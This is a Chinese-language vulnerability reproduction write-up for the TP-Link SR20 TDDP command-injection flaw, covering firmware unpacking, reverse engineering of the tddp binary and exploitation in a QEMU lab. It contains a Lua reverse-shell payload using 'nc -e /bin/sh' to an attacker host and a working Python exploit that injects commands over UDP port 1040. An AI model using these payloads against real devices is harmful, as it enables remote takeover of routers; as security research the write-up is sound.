## Description

查阅相关资料可知，`TDDP`协议(TP-LINK Device Debug Protocol) 是`TP-LINK`申请了专利的一种在`UPD`通信的基础上设计的协议，而Google安全专家Matthew Garrett在`TP-Link SR20`设备上的`TDDP`协议文件中发现了一处可造成 **“允许来自本地网络连接的任意命令执行” 的漏洞**。

复现环境：Ubuntu-22.04 
固件下载：https://blog.zer0ptr.icu/attachment/SR20(US)_V1_180518.zip

## TDDP协议

![TDDP报头格式如下](https://www.iotsec-zone.com/images/MdImg/0bd7dcad717a797de0bbd5e5c47c2e57.png)

其中，`TDDP`报头中的`Ver`字段是版本号，分为`V1`和`V2`两个版本，`V1`版本是不需要进行身份认证的；`Type`字段是报文类型，编号及类型的对照如下：

- 4：CMD_AUTO_TEST   
- 6: CMD_CONFIG_MAC   
- 7: CMD_CANCEL_TEST
- 8: CMD_REBOOT_FOR_TEST   
- 0XA:CMD_GET_PROD_ID   
- 0XC: CMD_SYS_INIT 
- 0XD: CMD_CONFIG_PIN   
- 0X30: CMD_FTEST_USB   
- 0X31: CMD_FTEST_CONFIG

根据公开的漏洞信息，这个漏洞存在于`V1`版本下的`0X31: CMD_FTEST_CONFIG`类型处。

## 逆向分析

我们先用 binwalk -Me <firmware_file>

> 这里我修改了下解包出来的目录名

![](/images/iot-tp-link-sr20-rce/1.png)

`squashfs-root` 目录就是我们需要的固件文件系统。

在该文件系统目录下查找存在漏洞的 `tddp` 文件并查看文件类型可以看到该文件是一个 `ARM` 架构的小端(Small-Endian)32 位 `ELF` 文件

最高有效位 MSB(Most Significant Bit) 对应大端 (Big-endian) 最低有效位 LSB(Least Significant Bit) 对应小端 (Little-endian)

![](/images/iot-tp-link-sr20-rce/2.png)

然后我们进到ida，由于我们找不到主函数所以去看一下 `_start`，然后这个地方跳转的 `sub_971C`就是主函数，我将其命名为 `main`

![](/images/iot-tp-link-sr20-rce/3.png)

首先去分析第一个函数 `sub_16C90`，这个函数是对内存进行初始化分配：

![](/images/iot-tp-link-sr20-rce/4.png)

```c
int sub_16C90()
{
  int i; // [sp+4h] [bp-8h]

  dword_21A34 = (int)calloc(1u, 4u);
  if ( !dword_21A34 )
    return sub_13018(-10201, "no memery");
  for ( i = 0; i <= 0; ++i )
    *(_DWORD *)(dword_21A34 + 4 * i) = 0;
  return 0;
}
```

然后看 `sub_16D40`，这个函数是对分配的内存进行回收：

```c
int sub_16D40()
{
  free((void *)dword_21A34);
  return 0;
}
```

那我们现在去看看中间的 `sub_936C` 函数：

![](/images/iot-tp-link-sr20-rce/5.png)

上面圈出的一堆函数是对内存的初始化以及对 `socket` 套接字的初始化，其中值得关注的是 `sub_16D68` 函数：

```c
int __fastcall sub_16D68(int a1, uint16_t a2)
{
  struct sockaddr s; // [sp+8h] [bp-14h] BYREF

  memset(&s, 0, sizeof(s));
  s.sa_family = 2;
  *(_DWORD *)&s.sa_data[2] = htonl(0);
  *(_WORD *)s.sa_data = htons(a2);
  if ( bind(a1, &s, 0x10u) == -1 )
    return sub_13018(-10103, "failed to bind socket");
  else
    return 0;
}
```

我们关注到这条：

```c
*(_WORD *)s.sa_data = htons(a2);
```

这里的 `a2` 是后面传入的 `1040`，`htons` 函数是将整型变量从主机字节顺序转变成网络字节顺序，而 `bind` 函数是将一个本地地址与一个套接口进行绑定，这个函数的目的就是将 `socket` 套接字绑定到了 `1040` 端口上。

继续往下走，这里的 `sub_9340` 是用于获取当前时间，然后往下是一些时间相关的校验，对于我们并不重要，我们往下走看到 `sub_16418`：

![](/images/iot-tp-link-sr20-rce/6.png)

![](/images/iot-tp-link-sr20-rce/7.png)

我们找到一个关键的函数 `recvfrom()`，这个函数的内部构造如下：

```c
// attributes: thunk
ssize_t recvfrom(int fd, void *buf, size_t n, int flags, struct sockaddr *addr, socklen_t *addr_len)
{
  return __imp_recvfrom(fd, buf, n, flags, addr, addr_len);
}
```

该函数的原型是：

```c
ssize_t recvfrom(int sockfd,void *buf,size_t len,unsigned int flags, struct sockaddr *from,socklen_t *fromlen)
```

该函数用于接收远程主机经指定的socket传来的数据，并把数据传到由参数 `buf` 指定的内润空间，也就是说是通过socket套接字传输TDDP包到目标IP的1040端口。

![](/images/iot-tp-link-sr20-rce/8.png)

从上图可以看出，`v2`是接收到的TDDP数据包，其中 `if (v2 == 1)` 就是判断版本号是否等于1，而这个漏洞就是发生在 `Version 1`，也就是这个if分支，我们再进入接下来的 `sub_15E74` 函数，发现其是对 `Type` 类型的判断。

![](/images/iot-tp-link-sr20-rce/9.png)

我们选择追踪 `case 0x31` 处：

![](/images/iot-tp-link-sr20-rce/10.png)

进到 `sub_A580` 中：

![](/images/iot-tp-link-sr20-rce/11.png)

从上图可以看到，当 `TDDP` 协议是 `Version 1` 的时候，`v19` 会从 `TDDP` 包的首地址往后移12个字节，也就是从“报头”移动到“数据”的首地址（见上面的TDDP协议结构图），接着就到了一个 `sscanf` 函数：

![](/images/iot-tp-link-sr20-rce/12.png)

这个 `sscanf` 函数将传进来的 `TDDP` 包数据区按照分离符 `;` 分为 `s` 和 `v10` 两个字符串，其中过滤了 `s` 中的 `;`，然后字符串 `s` 拼接到了 `cd /tmp;tftp -gr` 后面，而这是一个shell命令，如果把 `s` 拼接上去那可能会导致命令执行，我们看看 `sub_91DC` 函数：

![](/images/iot-tp-link-sr20-rce/13.png)

可见这里就是一个可以执行shell命令的地方。

我们再来看另一个地方：

![](/images/iot-tp-link-sr20-rce/14.png)

这里把一个文件的路径保存在了 `name` 字符串中，然后通过 `lual_loadfile` 函数进行加载。

## 利用姿势

1. 字符串 `s` 在 `sscanf` 分离的时候仅过滤了 `;`，而 `|` 和 `&` 也可以作为连接符，对两句独立命令进行连接。
2. `tftp -gr ...` 命令是利用 `FTP` 协议，从 `...` 路径下载文件，在这里是保存到 `/tmp` 目录下，我们回想一下上面那张图，于是我们可以搭建一个 TFTP Server然后在某个目录下放置一个可执行恶意命令的 `Lua` 脚本文件。

## Know it then hack it

### 搭建 TFTP Server

1. 执行 `sudo apt install atftpd` 命令安装 `atftpd`
2. 将 `/etc/default/atftpd` 文件改成如下内容：

```shell
USE_INETD=false
# OPTIONS below are used only with init script
OPTIONS="--tftpd-timeout 300 --retry-timeout 5 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /tftpboot"
```

3. 新建 `/tftpboot` 目录，并赋予 `777` 权限，然后在 `/tftpboot` 目录下放一个可执行反弹shell命令的Lua脚本文件payload：

```shell
function config_test(config)
    os.execute("/bin/nc -e /bin/sh <宿主机ip> <port>")
end
```


4. 执行 `sudo systemctl start atftpd` 命令启动TFTP服务即可

5. 执行 `sudo systemctl status atftpd` 命令可查看atftpd服务状态

### QEMU 环境配置

下载这三个文件：

```shell
wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress
wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress
wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2
```

启动脚本如下：

```shell
#!/bin/bash
sudo qemu-system-arm \
    -M vexpress-a9 \
    -kernel vmlinuz-3.2.0-4-vexpress \
    -initrd initrd.img-3.2.0-4-vexpress \
    -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \
    -append "root=/dev/mmcblk0p2 console=ttyAMA0" \
    -net nic -net tap \
    -nographic
```
然后将解包出来的 `squashfs-root` 文件上传到QEMU里面即可。


### Exploit

这里就是根据我们上面分析的内容进行构造exp，我们尝试写入一个 test.txt 到 /tmp/ 目录下，内容为 h4ck_f0r_fun：

```python
from socket import *
import sys

tddp_port = 1040
ip = sys.argv[1]

command = "|echo h4ck_f0r_fun > /tmp/test.txt;"
s_send = socket(AF_INET, SOCK_DGRAM, 0)
payload = b'\x01\x31'.ljust(12, b'\x00')
payload += command.encode() + b"winmt"
s_send.sendto(payload, (ip, tddp_port))
s_send.close()
```

![](/images/iot-tp-link-sr20-rce/command_injection.png)

（另一个案例因为我太懒了没截图也就懒得写了qwq